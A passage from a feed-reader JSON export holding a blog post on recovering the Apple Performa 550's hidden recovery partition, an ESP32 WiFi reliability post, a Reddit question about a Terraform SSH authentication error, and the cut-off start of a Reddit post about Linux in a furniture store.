rel=\"noreferrer noopener\">MAME</a> has come a long way in the last few years. He figured out a bunch more stuff on his own after that, including trying it in his own Performa 450 (not 550), but the bottom line was that the recovery partition was nowhere to be found.</p><p>Well, sort of. He found that the process of restoring from the CD actually did create a recovery partition. Here’s a screenshot of the partitioning from inside of Apple HD SC Setup while booted from the Performa CD, after formatting the hard drive by clicking the Initialize button in the main window:</p><p>As you can see, there’s a 2,560 KB partition of type Apple_Recovery almost at the end of the drive, just after the main partition named “Hard Disk”. This was promising at first glance, but the partition was empty! Further testing revealed that the custom Performa-specific version of Apple HD SC Setup (7.2.2P6) bundled on the CD was responsible for creating it, but didn’t actually populate it with any data. Apple Backup also didn’t put anything onto the partition, despite what the book said. I even looked through <a href=\"https://www.downtowndougbrown.com/2013/06/legacy-apple-backup-file-format-on-floppy-disks/\" data-type=\"post\" data-id=\"457\" target=\"_blank\" rel=\"noreferrer noopener\">my past disassemblies of the Apple Backup and Apple Restore code</a> and confirmed that there was nothing related to creating a recovery partition.</p><p>The conclusion at the time was that someone needed to get ahold of a Performa 550 that still had its original hard drive and had never been reformatted. That’s where this story sat for 3 years. </p><p>A few months ago, I remembered this whole situation and decided that I really wanted to try to find this partition. After all, the clock had always been ticking. The longer we waited, the fewer and fewer original Performa 550s would be out there in the wild. Not to mention that hard drives go bad and people throw them out without knowing that it’s usually possible to recover data from drives of this era. I confirmed all of Pierre’s findings in MAME. I even tried using Apple Backup in case I missed something, but no, it didn’t do anything with the hidden recovery partition. An easy way to look at it is to manually edit the partition table in a hex editor and change the type from Apple_Recovery to Apple_HFS.</p><p>After doing this and booting up, I found another hard drive icon on my desktop called Recovery Volume, but it was empty, just like Pierre said:</p><p>Taking it a bit further, I tried recreating the recovery functionality myself. I copied a minimal system folder to the Recovery Volume, and then changed its type back to Apple_Recovery. This made it invisible again. Then I screwed up my main system folder and rebooted. Sure enough, it automatically came up with the Recovery Volume as the main boot volume.</p><p>This proved that the mechanism for booting from the recovery partition worked; we were just missing the data that was supposed to be on it. I came to the same conclusion that Pierre had already reached: we needed to find a Performa 550 that had never been reformatted. In the meantime, I spent some time digging into archives of Apple’s old tech notes and found several more references to this functionality.</p><blockquote><p><em>Backup Partition Software-automatically detects corrupted system folders. When a bad System Folder is detected, the user is given the option to re-load another System Folder into their system.</em></p></blockquote><blockquote><p><em>The Apple Backup application creates a backup recovery partition that allows the Performa to boot even when the System Software on the main hard drive has been corrupted. The partition is invisible to the user.</em></p></blockquote><blockquote><p><em>There is no built-in limit to the number of times the backup partition can be used. However, the partition will be lost if the hard drive is re-formatted. At this time the backup partition is used only on the Performa 550.</em></p></blockquote><p><a href=\"https://ia600306.us.archive.org/view_archive.php?archive=/21/items/APPLE_TIL_ARTICLES/TIL00001_to_TIL60496.zip&amp;file=TIL16006-Performa_550-System_Folder_Created_w-Dinosaur_Safari_CD_8-94_%28TA32248%29.pdf\" target=\"_blank\" rel=\"noreferrer noopener\">Performa 550: System Folder Created w/ Dinosaur Safari CD (8/94)</a> — not that I needed any more proof of the recovery partition’s existence at this point, but I got a kick out of this one. It talks about how launching an educational game about dinosaurs accidentally caused the system to go into recovery mode. It provided a little more info about what would happen when the recovery dialog popped up:</p><blockquote><p><em>When I launch the Dinosaur Safari CD from Creative Multimedia, a dialog box appears telling me that my Performa computer is having trouble starting up. I only have two options Shutdown or Continue? Why?</em></p></blockquote><p>After reading these articles, I was very convinced that the recovery partition was a real thing that existed, but I was also pretty confident that Apple Backup wasn’t responsible for creating it, despite Apple claiming otherwise. I had already seen that the special build of Apple HD SC Setup was what actually created it, and plus, like I said earlier, I had looked closely into a disassembly of the version of Apple Backup supplied with the Performa 500 series restore CD. There was nothing that copied any files to another partition on the hard drive, at least not that I could see.</p><p>Really, the most important thing I gained from this exercise was that the second tech note confirmed the need to find a Performa 550 that had never been reformatted. Also, if the first tech note was to be believed, it needed to have come with System 7.1P6. This could narrow the search even further — <a href=\"https://groups.google.com/g/comp.sys.mac.system/c/Wj1dL2xW3XQ/m/rt7YC4t-YzsJ\" target=\"_blank\" rel=\"noreferrer noopener\">I know for a fact that earlier Performa 550 models came with 7.1P5</a>, including my childhood one. The same tech note also pointed out that 7.1P6 was the first version to support the “AppleCD 300+”, which is referring to the tray-loading CD-ROM drive. Based on this information, it’s reasonable to deduce that all Performa 550s with a tray-loading CD-ROM drive would probably have originally come with at least System 7.1P6.</p><p>There was only one thing left to try at this point: asking the Internet for help. I asked people everywhere I could think of: <a href=\"https://tinkerdifferent.com/threads/performa-550-unpreserved-recovery-partition.4048/\" target=\"_blank\" rel=\"noreferrer noopener\">Tinker Different</a>, <a href=\"https://68kmla.org/bb/index.php?threads/performa-550-and-recovery-partition.39815/#post-551319\" target=\"_blank\" rel=\"noreferrer noopener\">68kMLA</a> (where <a href=\"https://68kmla.org/bb/index.php?threads/performa-550-and-recovery-partition.39815/\" target=\"_blank\" rel=\"noreferrer noopener\">Pierre had already asked</a>), and <a href=\"https://www.reddit.com/r/VintageApple/comments/1i75ns6/anybody_have_a_performa_550_that_has_never_been/\" target=\"_blank\" rel=\"noreferrer noopener\">various</a> social media <a href=\"https://bsky.app/profile/downtowndougbrown.com/post/3lconemblks2q\" target=\"_blank\" rel=\"noreferrer noopener\">sites</a>. I searched Reddit and found people who had posted in the past about having a 550, asking if they still had the hard drive. I think I scared some of them — at least one person deleted their post after I asked! To be honest, I can’t blame them. I can imagine how freaky it would be to hear from someone begging to look at my hard drive’s contents. I’m sure some people might think of it as crossing a line, but it’s not as crazy of an ask if it’s a machine they’ve received second-hand from someone else. Plus, I was very clear about exactly what I was looking for (and why).</p><p>I asked a seller of a Performa 550 that had been sitting on eBay for a long time if they would be willing to sell me the hard drive separately. They weren’t interested. I even bought some random hard drives on eBay that definitely went with a 5xx-style case. These were easy to identify because this case style uses a unique adapter for plugging the drive into the chassis wiring harness when you slide it into place.</p><p>What do I have to show for all of these eBay purchases? Well, after dumping them all with my <a href=\"https://zuluscsi.com/\" target=\"_blank\" rel=\"noreferrer noopener\">ZuluSCSI</a> in initiator mode, I can say that the one pictured above came from a Macintosh TV. I also found another one from an LC 575. Lastly, I bought yet another drive that the seller said came from a Performa 577. The Performa 577 one was funny — it had all the Mac mounting hardware on it, but when I dumped it, it turned out to be from an Atari TT or Falcon (not sure which). I’d love to hear the story of how it ended up with an LC 5xx drive sled and adapter on it! Needless to say, none of them had the elusive recovery partition. One particularly friendly eBay seller was even nice enough to show me a preview of a drive’s contents in HFSExplorer, which helped me determine that it wasn’t from a Performa.</p><p>I almost began questioning my sanity at one point during this search. Multiple people initially told me that they thought I was confused about this whole thing. I pointed them toward Apple’s tech notes describing it. Were Pierre and I imagining this whole thing? Were Apple’s tech notes all a lie?</p><p>The thing is, this whole functionality was super obscure. It’s understandable that people weren’t familiar with it. Apple publicly stated it was only included with this one specific Performa model. Their own documentation also said that it would be lost if you reformatted the hard drive. It was hiding in the background, so nobody really knew it was there, let alone thought about saving it. Also, I can say that the first thing a lot of people do when they obtain a classic computer is erase it in order to restore it to the factory state. Little did anyone know, if they reformatted the hard drive on a Performa 550, they could have been wiping out rare data that hadn’t been preserved!</p><p>Someone who saw my post on Reddit mentioned that they had a Performa 550 and would check it out. It was a newer tray-loading model with a January 1994 manufacture date. Unfortunately, the Conner hard drive inside of it wouldn’t cooperate, and plus this person didn’t have anything capable of dumping the contents. Luckily for me though, they were totally comfortable with letting me borrow the drive and try to recover the data from it.</p><p>To tie everything together, we have now reached the point in this story that I covered in <a href=\"https://www.downtowndougbrown.com/2025/03/the-gooey-rubber-thats-slowly-ruining-old-hard-drives/\" data-type=\"post\" data-id=\"10245\" target=\"_blank\" rel=\"noreferrer noopener\">my last post about hard drives with stuck heads</a>. As I mentioned in that blog, I could not get this drive to do anything. It would just spin up, sit there for a while, spin down, and then make an annoying buzzing sound for a while, repeating that whole process over and over again.</p><p>I tried all kinds of things. I nudged the head while the platters were spinning, inspected it with my thermal camera to see if any components were getting hot, and tried it at different temperatures — cold shortly after it arrived, and at room temperature later. The only thing I noticed was that when it was making the buzzing sound, one of the IRFD123 MOSFETs would get much hotter than normal: up near 100 degrees Celsius.</p><p>I wasn’t really sure what to do with this information though. It just seemed wrong that the head wasn’t moving at all. That’s when I finally decided to inspect everything further inside the drive and noticed the head stack seemed like it was sticking to a rubber/plastic looking piece. The Kapton tape trick I figured out and showed off in the last post finally allowed me to dump the drive contents. If you didn’t catch it last time, here’s a video showing how it was stuck, along with a successful dump with the help of the tape:</p><p>As soon as the drive imaging process completed, I powered everything off and anxiously opened the hard drive image file with my favorite hex editor (<a href=\"https://mh-nexus.de/en/hxd/\" target=\"_blank\" rel=\"noreferrer noopener\">HxD</a>):</p><p>Boom! This drive had a recovery partition on it! Now, that didn’t necessarily mean anything. After all, I had already seen an empty partition created by Apple HD SC Setup on the Performa CD. Still, though, it was definitely promising. Here’s an interpretation of the data at the beginning of the entry in the partition table:</p><p>50 4D = PM = Signature00 00 = Padding<p>00 00 00 05 = 5 total partitions on the drive</p>00 04 E2 60 = starting physical block of the partition (0x4E260 blocks = 0x9C4C000 bytes)<p>00 00 14 00 = size of partition in blocks (0x1400 blocks = 0x280000 bytes = 2560 kilobytes)</p>name = MacOS</p><p>Also, just like in the partition table created by the Performa CD that I had inspected earlier, there were four bytes “msjy” at an offset of 0x9C bytes into the partition table entry. No other partitions had any data at 0x9C. I wonder if these are a couple of developers’ initials hiding in there or something? Is it an acronym? “Make Steve Jobs Yodel”? I even asked ChatGPT to come up with a playful interpretation in the context of Macs in the mid-1990s. It suggested “My System Jammed Yesterday”, explaining it as a playful nod to the “chaotic charm” of the era’s extension conflicts and Sad Mac screens. I didn’t even mention anything about it involving OS recovery. Tell me how you really feel about old Macs, ChatGPT!</p><p>Knowing that the partition was there, the next step was to look near the end of the dumped drive image in HxD. If the partition had any actual data stored, it would be very obvious because starting at 0x9C4C000 in the file, there would be actual data and not just a bunch of zeros.</p><p>This is where I started to actually get excited. The partition contained boot blocks! This was obvious because of the starting signature of LK and all of the various system file names plainly visible. On the other hand, the recovery partition created by the Performa CD during testing had zeros at this location — no boot blocks.</p><p>These boot blocks are identical to the main partition’s boot blocks, except for one very important difference: at 0x1A, the Pascal string containing the Finder name is “recovery” instead of “Finder” like you’d normally see. This means that if you boot from this partition, it will load a program named recovery instead of the usual Finder app you’d expect on most Mac OS installs.</p><p>This was definitely something special that the restore CD was not capable of recreating. As I scrolled further down through the partition, it quickly became obvious that it actually had some files!</p><p>Okay, now I was totally stoked! I booted up a copy of the imaged drive in MAME and immediately noticed that there was evidence that the recovery partition had definitely activated itself on this machine in the past: there was a folder named  on the desktop with a creation date in 2004, and the trash contained an app called Read Me Mini System Folder with the exact same date.</p><p>I wanted to experience the automatic OS recovery process for myself without any customizations from the original owner of the machine this hard drive came from, so I used HxD to copy the entire 2,560 KB recovery partition onto the fresh hard drive image I had created by restoring from the Performa CD. This was easy because the Performa version of Apple HD SC Setup had created an empty recovery partition with the exact same size. Then I booted it up in MAME and dragged the System file out of my System Folder in order to intentionally mess it up. I had to turn off System Folder Protection in the Performa control panel first:</p><p>This is the classic kind of mistake that would have normally left you with an unbootable system showing a floppy disk icon with a flashing question mark. Would Apple’s automatic Performa OS recovery save me from myself? I rebooted to see what would happen. Instead of seeing a flashing question mark, I saw a Happy Mac very briefly before the system rebooted itself again. Then another Happy Mac showed up, and this time, it looked like a normal boot, except no extension icons showed up at the bottom of the screen. It was definitely booting from the recovery partition. Eventually, I was greeted with this screen:</p><p>Hooray! This was exactly the dialog box that Macworld Mac Secrets and Apple’s tech note had referred to. The recovery partition had been successfully rescued!</p><p>Let’s walk through the rest of this feature. If you click Shut Down, obviously the machine turns itself off. But when it boots back up, the recovery partition doesn’t automatically kick in anymore. So you’re on your own to fix the problem by booting from the Performa CD or the Utilities floppy disk.</p><p>On the other hand, clicking OK does exactly what the tech note describes. You get the wristwatch cursor for a few seconds, the system reboots, and then you are greeted with this amazing screen, complete with an ugly yellow desktop pattern. Shall we call it the yellow screen of shame? Notice that the Mini System Folder on the desktop is the active System Folder, because it has the special icon.</p><p>Here are the rest of the pages in this Read Me Mini System Folder app:</p><p>Aha! So it’s not entirely automatic, since you still have to manually drag the System, Finder, and System Enablers from the Mini System Folder back to your original System Folder. Still though, it’s a very handy solution that gives you a bootable machine when something goes wrong with your OS.</p><p>If you just ignore these instructions and keep using the computer, you will be nagged with this Read Me on every boot because it lives inside the Startup Items folder of the Mini System Folder. The Read Me also appears on your desktop, but for some reason it doesn’t show up until you open the Hard Disk icon.</p><p>Let’s take a deeper look at how it all works by temporarily changing the partition type to Apple_HFS instead of Apple_Recovery and booting up again, so we can inspect the files. After a quick automatic rebuild of the desktop file, the Recovery Volume appears, with actual contents this time!</p><p>Inside of the System Folder, there are definitely some interesting things. As expected based on the earlier analysis of the boot blocks, there is an app named “recovery” that contains all of the interesting stuff. The icons are kind of arranged willy-nilly in here.</p><p>The creator code of the recovery app is msjy — the exact same magic value we saw in the partition table entry.</p><p>Scrolling further down, there is a System file and various enablers. Everything is marked as being part of System Software v7.1P6.</p><p>It’s interesting to me that although this recovery partition was only available on the 550, it still has a bunch of enablers for other Performa models: the 45x/46x, 47x/57x, and 600. I guess that’s not too crazy considering all of these exact same enablers are included with a fresh copy of System 7.1P6 installed using the Performa CD.</p><p>As a quick detour, System Enabler 316 is an interesting one that is hard to find info about on the Internet. I inspected its ‘gbly’ resource and determined that it’s for the Centris 610, Centris 650, and Quadra 800. It’s an older version of the enabler created before <a href=\"https://512pixels.net/2021/03/the-sad-story-of-the-centris/\" target=\"_blank\" rel=\"noreferrer noopener\">the speed-bumped Quadra 610 and Quadra 650 were a thing</a>. I wonder if there was a plan at some point to have a Performa model based on one of those machines? If I had to guess, maybe it would have been a 68040-based successor to the Performa 600, which uses the same case style as the Centris 650. The Performa 650?</p><p>Let’s not get too far off track. Back to the Recovery Volume’s System Folder — as expected, the Startup Items folder contains the Read Me application:</p><p>Everything started to become clear. The recovery app was marked as the startup application instead of the Finder. It displayed the dialog giving the user the option to recover. If they clicked OK, it would copy the entire System Folder from the Recovery Volume, omitting itself, to the Desktop Folder of the main hard drive partition. Then, it would “bless” the newly-copied mini System Folder and reboot.</p><p>How did all this stuff get into the partition? Did Apple Backup do it, or was it factory-programmed data? I tried to see if I could deduce anything from the dates of the files. In order to preserve the integrity of all of the displayed dates, I performed this analysis with a read-only copy of the original drive image in order to prevent any modification dates from being updated.</p><p>All of the files in the partition have a creation date of March 4, 1994 — over 31 years ago! Most of the files have a matching modification date, except for the System suitcase, which was last modified on September 26, 1994. I don’t know exactly what this all means, considering it came from a machine with a January 1994 manufacture date.</p><p>The Recovery Volume itself also has a creation date of March 4th, just five minutes before the creation date of all the files. Interestingly, the modification date of the volume is still shown as March 4th in the Get Info window, even though the System suitcase was modified later in September of that year.</p><p>The Master Directory Block of the Recovery Volume says the modification date (drLsMod) is September 26th, matching when the System file was changed. I’m not sure what causes this discrepancy. I guess the date displayed in the Get Info window isn’t simply the date stored in the Master Directory Block.</p><p>Similarly, although the main hard drive partition has a creation date of December 5, 1993 according to the Master Directory Block, the Get Info window says it was created on February 3, 1994. I’m not sure which one is more accurate. Either way, it’s pretty clear this drive had not been reformatted. I did find it curious that the recovery partition was created over a month later, though. When you reformat a hard drive using the special version of Apple HD SC Setup on the Performa CD, the recovery partition ends up with a creation date about a minute after the main partition.</p><p>The Finder and System Enablers in the recovery partition are identical to the same stock files from a 7.1P6 restore. The only difference I could find in the System file was that the recovery partition’s version was missing a single At Ease ‘INIT’ resource, but the At Ease Startup extension automatically adds it to the System file after you reboot. This leaves you with a System file totally identical to what is restored from the Performa CD. I find it odd that At Ease was stripped out, but the American Heritage Dictionary ‘FKEY’ resource was not.</p><p>The best theory that I can come up with is that Apple Backup really was responsible for creating this partition. After all, Apple went out of their way to specifically mention it in their tech note. Maybe March 4th, 1994 was the date when the original owner of the computer backed it up for the first time. September 26th could have been the last time that Apple Backup was run. Perhaps the owner completely uninstalled At Ease from the computer between March and September, so the System file had been changed and the recovery copy needed to be updated accordingly? Unfortunately, most of the Performa-specific software had been deleted from this computer. It was still running System 7.1P6, but Apple Backup was nowhere to be found. So I wasn’t able to confirm whether or not a mysterious, unpreserved newer version of Apple Backup was really responsible for populating the partition.</p><p>The other theory floating around in my head is that maybe it came from the factory like this. The March 1994 timeline is consistent with the date of the tech note describing the functionality, so maybe that’s when Apple created it and started bundling it. I don’t know how long the machines sat at Apple’s factory before they were actually sold — does a manufacture date of January 1994 also mean it was shipped to a store in January 1994? Either way, I definitely don’t know how to explain the September 26th, 1994 modification date. Maybe a third-party utility did something to the System file on the secondary partition? The first Apple Backup theory seems like the more likely explanation, especially given that Apple said that’s how it was created.</p><p>This whole question is the last piece of the puzzle that hasn’t been solved yet. If anyone else has a Performa 550 and would be willing to dump their hard drive or at least look at Apple Backup, I’d be very interested in finding out A) if it has the recovery partition and B) if there was a special newer version of Apple Backup that didn’t make its way onto the Performa CD. I searched for various strings that show up in the “recovery” and “Read Me Mini System Folder” apps, and they aren’t anywhere on the Performa CD. I guess they could be stored compressed somewhere, but I’m pretty confident based on the actual Apple Backup code that nothing is hiding in there. Here are the various versions (with their exact sizes and dates) of Apple Backup that I have seen on Performa 550 installations. None of these have the recovery partition creation built in:</p><p>I also found version 1.3 (June 15, 1994, 163,388 bytes used) by restoring from a Performa 636 restore CD. It, too, does not contain any recovery partition code.</p><p>For a demo, I thought it would be fun to replicate the problem that the Apple tech note mentioned about the Dinosaur Safari CD inadvertently activating the recovery partition, so I bought a copy to test it out. To make it even more interesting, I decided to run this test on real hardware. I’m leaning toward believing that a lot of the older caddy-loading models (possibly all of them) didn’t have this recovery partition, so just pretend it’s a newer model that came with System 7.1P6. I copied the recovery partition onto a real Apple-branded IBM 160 MB SCSI hard drive using ZuluSCSI’s USB MSC initiator mode, which allows it to act as a USB-to-SCSI bridge. Sorry about the flickery screen; I couldn’t get my phone camera’s shutter speed to sync up perfectly with the display’s refresh rate.</p><p>Sure enough, when I opened the game from the CD, the computer did exactly what Apple’s tech note said it would do. The workaround of copying the application to my hard drive worked just fine. If it’s not obvious, I sped up the process of copying it to the hard drive — it took a while! It might be interesting someday to look into why this game accidentally activated the OS recovery, but this blog is already getting way too long!</p><p>I want to talk a little more about the yellow screen of shame. When I first saw it, I wasn’t entirely sure if it was really part of the recovery functionality or if the original owner just had terrible taste.</p><p>Digging deeper, I found three clues that all made it clear it was an intentional choice by Apple to really make it obvious that something was wrong. First, the yellow pattern is stored as a ‘ppat’ resource in the recovery app.</p><p>Second, the System file in the recovery partition has the default blue-gray Performa background shown in the screenshots above. This makes sense, because it’s the pattern that showed up with the dialog about the Performa having trouble starting up.</p><p>And lastly, page 3 of the Read Me app implies that something may have changed your desktop pattern.</p><p>So clearly, the recovery process, by design, sets up the custom yellow background.</p><p>Why did I care so much about finding this lost partition? Well, there are a number of reasons. For one, this is exactly the kind of research project that’s perfect for me because I don’t know how to let things go. It’s also something that, quite frankly, needed to be preserved before it became extinct. The most important reason, though, is that this functionality is historically significant and deserves some attention. How many personal computers in 1994 still had the ability to boot after the OS was trashed? Isn’t this an extremely early example of this type of functionality? Did Windows have anything like this prior to Vista? Did the Mac have anything else like this prior to sometime in the OS X era? I would love to hear more comments about what you think on this. I admittedly don’t know a ton about older machines that weren’t Macs.</p><p>I’m not saying this feature is perfect. Since we’ve already seen that the Dinosaur Safari CD was able to accidentally activate it, I wouldn’t be surprised if there were other ways to inadvertently cause it to pop up too. It also required manual intervention after the recovery process, which meant that you needed a fair amount of computer knowledge to finish fixing your OS. The average Joe Schmoe would probably have trouble following these directions to fix the System Folder. But still, it leaves you with a bootable system instead of an unusable computer with a flashing question mark. It’s very cool, especially for 1994.</p><p>I wonder why Apple didn’t continue down this path with subsequent models? Or even retroactively adding the functionality to earlier ones after a fresh install of a newer OS. I’m not aware of any other Macs that have this partition. It doesn’t depend on any special ROM support or anything like that, at least as far as I can see. I tried out the recovery functionality on several other machines: a IIci, LC, LC 475, and an emulated Performa 600, and it works great on all of them. Heck, it even works on the Classic II/Performa 200!</p><p>It kind of looks like the window size of the Read Me app was a calculated decision to ensure it would fit on the 512×342 screen used in black-and-white compact Macs.</p><p>Thinking about later models, the Performa 630 series used an internal IDE hard drive instead of SCSI, so the custom version of Apple HD SC Setup was no longer used. I wonder if the Performa 57x series had this partition? You’d think they would have had the exact same software bundle as the tray-loading 550 models. If any readers have a Performa 57x machine, I’d greatly appreciate it if you could check!</p><p>How did this functionality actually work under the hood? I haven’t gone too deep into the code (maybe it can be a future post), but I have pieced together a few clues. The “msjy” magic number I talked about earlier definitely plays a part in everything. The special Performa version of Apple HD SC Setup also includes a custom version of Apple’s hard disk driver. This driver contains several references to msjy, so I’m pretty sure that’s what it uses to identify the recovery partition.</p><p>I also discovered that the 7.1P4 and 7.1P5 Utilities floppy disks, which were bundled with various Performas, have slightly older custom versions of Apple HD SC Setup: 7.2.1P and 7.2.2P respectively. They also create the recovery partition. The interesting thing about these versions is that it appears Apple accidentally forgot to strip out the debug function names, in both the utility itself and the bundled hard disk driver. They didn’t make this mistake in the original non-Performa 7.2.2 version, and they also didn’t make the mistake in the newer 7.2.2P6 version. Anyway, this is kind of cool, because it tells me the names of functions that look for “msjy” at an offset of 0x9C. Function names in that same area of the driver code include: , , , , and . So Apple definitely at least sort of released some of the recovery functionality to the public prior to 7.1P6, despite what their own version history says. And the disk driver is definitely involved in it.</p><p>Newer versions of Apple’s disk driver no longer contain the magic number, so at some point they must have abandoned this functionality. In my opinion, it’s a real shame that they ditched it — this could have been very useful going forward on all Macs. They could have even expanded on it and automated more of the recovery process. Sure, it used some of your hard drive space, but it could have been a good trade-off for better reliability.</p><p>That’s more than enough technical stuff for one post. I am sharing a download link where you can try this functionality out for yourself if you want. After all, the whole reason I did this was for software preservation purposes, so it makes sense to share it with the world. This is a small piece of Apple software history that, to my knowledge, has not been preserved until now. <a href=\"https://macintoshgarden.org/apps/system-71p6-performa-550-hidden-recovery-partition\" target=\"_blank\" rel=\"noreferrer noopener\">I uploaded a drive image to the Macintosh Garden.</a> Don’t worry, I didn’t include any of the original owner’s personal data. I started fresh with a blank hard drive image, restored it using the 7.1P6 Performa CD, and then only copied over the restore partition from the dumped hard drive. So this is a factory-fresh Performa 550 7.1P6 install with the recovery partition also present and populated.</p><p>The MAME command that I use to boot from this disk image is:</p><p>Of course, you can also test it out on a real machine by copying the hard drive image to a <a href=\"https://zuluscsi.com/\" target=\"_blank\" rel=\"noreferrer noopener\">ZuluSCSI</a> or <a href=\"https://bluescsi.com/\" target=\"_blank\" rel=\"noreferrer noopener\">BlueSCSI</a> and naming it something like HD00.hda.</p><p>Winding down this super long post now, the main lessons I learned from this research project are:</p><ol><li>If you get your hands on a vintage computer, strongly consider backing the hard drive up before erasing it. I know it might contain someone’s personal files, so be mindful of that, and of course respect their privacy. But there might still be something hiding in the background that has been lost to time. You never know — it happened here!</li><li>The fact that many hard drives go bad as they age might actually be a good thing for software preservation. If a vintage computer’s hard drive has a stuck head that can easily be bypassed, someone might sell it as non-working with data intact, rather than erasing it and selling it as “fully tested and wiped”.</li><li>There are some really awesome people out there in the world!</li></ol><p>Special thanks to <a href=\"https://www.journaldulapin.com/\" target=\"_blank\" rel=\"noreferrer noopener\">Pierre</a> for discovering that this functionality even existed in the first place, and getting the word out so we could eventually preserve it. I also have to thank David Pogue and Joseph Schorr for writing about it in their book many decades ago. And of course, huge thanks to the amazing person from Reddit, who asked not to be credited, who gave me the opportunity to borrow and repair the drive that ended up containing the lost partition. You’re seriously the best!</p><p>I’m going to repeat this again in case anybody has scrolled all the way to the end. There are still missing pieces of knowledge about how exactly this recovery partition would have been originally created. If you happen to have a Performa 550 with its original hard drive and wouldn’t mind checking for the partition and/or a special version of Apple Backup, please let me know! I would be happy to walk anybody through the process of dumping the drive contents. I’ll send you something if you don’t have the equipment needed to dump a hard drive. Even if the machine has been upgraded to System 7.5 or Mac OS 7.6, it’s still fine — everything could very well still be there, lurking in the background.</p>","contentLength":37272,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43376033"},{"title":"ESP32 WiFi Superstitions","url":"https://supakeen.com/weblog/esp32-wifi-superstitions/","date":1742080328,"author":"supakeen","guid":148,"unread":true,"content":"<p>The <a href=\"https://www.espressif.com/en/products/socs/esp32\">ESP32</a> is a popular microcontroller to use for do-it-yourself home automation, sensors, and a variety of other bits and bobs that you might want to take care of around the house. It’s the successor to the venerable <a href=\"https://www.espressif.com/en/products/socs/esp8266\">ESP8266</a> which has found its way into many of our WiFi connected devices (seriously, open up a device and chances are relatively large that you’ll find one).</p><p>After having done quite a few projects based on the ESP32 in the <a href=\"https://www.arduino.cc/\">Arduino</a> and <a href=\"https://docs.espressif.com/projects/esp-idf/en/stable/esp32/get-started/index.html\">esp-idf</a> frameworks I did start to notice some pecularities with my deployed devices (fancy wording for the one in my electrical cabinet that’s  to send the electrical usage data somewhere and a hodgepodge of sensor boards around the house, mostly the <a href=\"https://revspace.nl/Snuffelaar\">Snuffelaar</a> by <a href=\"https://tweakers.net/reviews/8876/tweaker-sebastius-over-zijn-soldeerworkshops-en-reparatieprojecten.html\">Sebastius</a> with firmware written by <a href=\"https://github.com/juerd\">Juerd</a>).</p><p>It seemed some of my ESP32 based boards were regularly losing connectivity. Initially my thoughts went out to the terrible power supplies I was using to run them (the cheapest of the cheap USB power supplies that came with a variety of accessories around my house). After switching these out for some more accessible and probably better quality tested <a href=\"https://www.ikea.com/nl/en/p/smahagel-3-port-usb-charger-white-60539177/\">Ikea chargers</a> the problems, however, persisted.</p><p>Asking around for experience from others at <a href=\"https://revspace.nl/\">RevSpace</a>, my local hackerspace, seemed to indicate that people had seen similar things with their ESP32-based projects. But not everyone had these issues. Slowly I started gathering more and more “superstitions” around how to keep these microcontrollers connected to my internet. Here are my favorite ones, I have applied all of these and while I haven’t tested them one-by-one the combination of them has ensured steady connections on my SSIDs.</p><p>While these workarounds don’t quite come close to placing a hexagon of CR2023 batteries around your ESP32 while you chant the 802.11ax specification at it, they have no basis in any  research I did. Take these as anecdotal workarounds for ESP32’s losing connectivity to your WiFi.</p><h2>Turn off power saving on the ESP32</h2><p>The ESP8266 never had any power saving for its WiFi modem stack, however the ESP32 . To me this is the most likely culprit in that in some network configurations, perhaps in combination with some radios, the power saving does something that makes it stop interacting with the network.</p><p>In your personal handcrafted firmware you can <a href=\"https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-reference/network/esp_wifi.html#_CPPv415esp_wifi_set_ps14wifi_ps_type_t\">use the following</a>, which should work in esp-idf  Arduino (from what I’ve been told):</p><div><pre tabindex=\"0\"><code data-lang=\"c\"></code></pre></div><p>For <a href=\"https://esphome.io/\">ESPHome</a> based projects you can add:</p><div><pre tabindex=\"0\"><code data-lang=\"yaml\"></code></pre></div><h2>Set your APs to use 20 Mhz wide channels</h2><p>If you have fancy network hardware then you can likely configure the channel width for the network that serves your ESP32’s. From what people and the internet tell me you  set the band width on the 2.4 Ghz network that your boards use to , not 40, not 60, and definitely not automatic.</p><h2>Pin your ESP32’s to a single AP</h2><p>It seems that when an ESP32 connects it goes straight for the first access point it sees. No matter if that access point is not the one you’ve taped it to. This can lead to bad connectivity, especially since I’ve not really observed ESP32’s moving around to other access points. If your network hardware allows it, you should pin the device to the closest one.</p><p>These urban legends have so far made it seem that at least my problems are ghosts of the past. I haven’t had a device drop from the network in about a week or two now while they used to drop multiple times per day. I’m planning to drop my application level keep-alives (still a good idea, I’ll write about them another time) because they seem to not be necessary at all anymore.</p><p>I hope these are of help to anyone, and that the spirits of the ESP32 deem your network worthy too.</p>","contentLength":3640,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43375780"},{"title":"Deploying Local Kubernetes Cluster with Terraform & KVM","url":"https://www.reddit.com/r/kubernetes/comments/1jc7np0/deploying_local_kubernetes_cluster_with_terraform/","date":1742080018,"author":"/u/rached2023","guid":367,"unread":true,"content":"<p>I'm trying to deploy a local Kubernetes cluster (1 master &amp; 2 workers) using Terraform on KVM-based virtual machines. However, when I run , I keep encountering the following error: </p><p><code>│ interrupted - last error: SSH authentication failed : ssh: handshake failed: ssh: unable to authenticate, attempted methods [none publickey], no supported │ methods remain</code></p><p>and this is my code for ssh : </p><pre><code>variable \"ssh_private_key\" { default = \"/home/rached/.ssh/id_rsa\" type = string } connection { type = \"ssh\" user = var.ssh_user password = var.ssh_password # The password for SSH authentication private_key = file(var.ssh_private_key) host = each.key == \"master1\" ? \"192.168.122.6\" : (each.key == \"worker1\" ? \"192.168.122.197\" : \"192.168.122.184\") timeout = \"5m\" </code></pre><p>I have already: ✅ Checked SSH key permissions<p> ✅ Verified that the public key is added to the VM</p> ✅ Confirmed that SSH is enabled on the VM</p><p>Has anyone faced a similar issue? Any insights or troubleshooting steps would be greatly appreciated!</p>","contentLength":994,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux in Furniture Store","url":"https://www.reddit.com/r/linux/comments/1jc76ce/linux_in_furniture_store/","date":1742078627,"author":"/u/S4ndwichGurk3","guid":383,"unread":true,"content":"<p>I was amazed today and have to share this.</p><p>I was in a large furniture store today in Germany and asked an employee about my online order. She went to the PC and I noticed that it runs Linux. It looked like an older version of KDE. Okay, Linux might be getting more popular for such use-cases, if I had a company like this I would also use Linux, so maybe not that special.</p><p>But what really amazed me was their software. It is as simple as it gets: a TUI with green text and black background, no mouse input, all done by keyboard, navigating around, entering in some numbers, and within seconds she printed something for me.</p><p>It reminded me of an opposite example at my health insurance provider, where she had to click and move the mouse for 5 minutes until she printed what I 